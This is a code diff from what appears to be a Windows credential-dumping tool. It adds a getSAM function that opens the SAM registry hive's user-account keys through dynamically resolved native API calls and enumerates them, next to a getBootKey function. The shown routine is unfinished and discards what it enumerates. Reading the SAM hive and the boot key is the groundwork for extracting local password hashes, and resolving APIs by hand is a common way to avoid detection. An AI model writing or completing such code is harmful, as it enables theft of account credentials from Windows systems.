@@ -10,6 +10,7 @@
 #include <Windows.h>
 #include <winternl.h>
 #include <BaseTsd.h>
+#include <ntstatus.h>
 
 #include "Main.h"
 
@@ -85,7 +86,42 @@ FARPROC myGetProcAddress(PCHAR moduleName, PCHAR exportName) {
 * 
 */
 void getSAM(PSAM* samRegEntries) {
+	HANDLE key;
+	OBJECT_ATTRIBUTES attributes;
+	UNICODE_STRING UnicodeRegPath;
+	ULONG lengthBuff;
+	KEY_FULL_INFORMATION keyInfo;
+	KEY_FULL_INFORMATION keyInfoSubKeys;
+	WCHAR RegPath[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users";
+	DWORD maxLenOfNames; 
+	
+	DWORD ret;
 
+	RtlInitUnicodeString(&UnicodeRegPath, RegPath);
+	InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+	ret = pMyNtOpenKey(&key, KEY_READ, &attributes);
+
+	if (ret != STATUS_SUCCESS) {
+		exit(GetLastError());
+	}
+
+	ret = pMyNtQueryKey(key, KeyFullInformation, &keyInfo, sizeof(keyInfo), &lengthBuff);
+
+	if (ret != STATUS_SUCCESS) {
+		exit(GetLastError());
+	}
+
+	if (keyInfo.SubKeys) {
+		for (int i = 0; i < keyInfo.SubKeys; i++) {
+			maxLenOfNames = MAX_KEY_LENGTH;
+			ret = pMyNtEnumerateKey(key, i, KeyFullInformation, &keyInfoSubKeys, sizeof(keyInfoSubKeys), &lengthBuff);
+
+			if (ret != STATUS_SUCCESS) {
+				exit(GetLastError());
+			}
+		}
+	}
 }
 
 void getBootKey(PSAM samRegEntry, int* bootKeyRet) {
